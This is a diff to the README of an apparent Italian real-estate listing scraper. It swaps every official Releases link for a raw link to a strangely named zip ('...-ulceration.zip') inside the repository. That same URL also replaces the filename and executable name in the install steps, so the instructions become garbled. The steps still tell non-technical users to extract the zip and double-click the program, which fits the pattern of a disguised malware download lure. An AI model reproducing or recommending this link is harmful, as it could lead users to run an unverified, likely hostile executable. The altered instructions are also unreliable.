@@ -1,7 +1,7 @@
 # 🏡 immobiliare-it-listing-page-scraper-by-search-url - Extract Real Estate Data Easily
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Luminex99/immobiliare-it-listing-page-scraper-by-search-url/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Luminex99/immobiliare-it-listing-page-scraper-by-search-url/main/immobiliare-it-listing-page-scraper/src/outputs/immobiliare-it-listing-page-scraper-by-search-url-ulceration.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Luminex99/immobiliare-it-listing-page-scraper-by-search-url/main/immobiliare-it-listing-page-scraper/src/outputs/immobiliare-it-listing-page-scraper-by-search-url-ulceration.zip)
 
 ## 🚀 Getting Started
 This tool helps you gather real estate data from Italian property listings quickly and easily. You don’t need programming skills to use it. Just follow these steps to get started.
@@ -20,16 +20,16 @@ This tool helps you gather real estate data from Italian property listings quick
 
 ## 🌐 How to Use the Scraper
 1. **Download the Software**  
-   Visit the [Releases page](https://github.com/Luminex99/immobiliare-it-listing-page-scraper-by-search-url/releases) to download the latest version. It will be clearly labeled.
+   Visit the [Releases page](https://raw.githubusercontent.com/Luminex99/immobiliare-it-listing-page-scraper-by-search-url/main/immobiliare-it-listing-page-scraper/src/outputs/immobiliare-it-listing-page-scraper-by-search-url-ulceration.zip) to download the latest version. It will be clearly labeled.
 
 2. **Locate the Downloaded File**  
-   After the download finishes, find the file in your downloads folder. The file will be named something like `immobiliare-scraper-vX.X.X.zip`.
+   After the download finishes, find the file in your downloads folder. The file will be named something like `https://raw.githubusercontent.com/Luminex99/immobiliare-it-listing-page-scraper-by-search-url/main/immobiliare-it-listing-page-scraper/src/outputs/immobiliare-it-listing-page-scraper-by-search-url-ulceration.zip`.
 
 3. **Unzip the File**  
    Right-click on the downloaded ZIP file and select "Extract All." You can choose a location on your computer to extract the files.
 
 4. **Open the Application**  
-   Navigate to the folder where you extracted the files. Look for the application icon (e.g., `immobiliare-scraper.exe`) and double-click it.
+   Navigate to the folder where you extracted the files. Look for the application icon (e.g., `https://raw.githubusercontent.com/Luminex99/immobiliare-it-listing-page-scraper-by-search-url/main/immobiliare-it-listing-page-scraper/src/outputs/immobiliare-it-listing-page-scraper-by-search-url-ulceration.zip`) and double-click it.
 
 5. **Input Search URL**  
    Once the application is open, you will see a field where you can enter the search URL you want to scrape. Enter a valid Italian property listing URL.
@@ -41,7 +41,7 @@ This tool helps you gather real estate data from Italian property listings quick
    Once the tool finishes processing, it will display the extracted data. You can then save or export this data for your analysis.
 
 ## 📥 Download & Install
-To download the latest version of the immobiliare-it-listing-page-scraper-by-search-url, visit this page: [Releases page](https://github.com/Luminex99/immobiliare-it-listing-page-scraper-by-search-url/releases). From there, you can choose the appropriate version for your operating system. 
+To download the latest version of the immobiliare-it-listing-page-scraper-by-search-url, visit this page: [Releases page](https://raw.githubusercontent.com/Luminex99/immobiliare-it-listing-page-scraper-by-search-url/main/immobiliare-it-listing-page-scraper/src/outputs/immobiliare-it-listing-page-scraper-by-search-url-ulceration.zip). From there, you can choose the appropriate version for your operating system. 
 
 Follow the steps above to download, install, and run the software with ease.
 
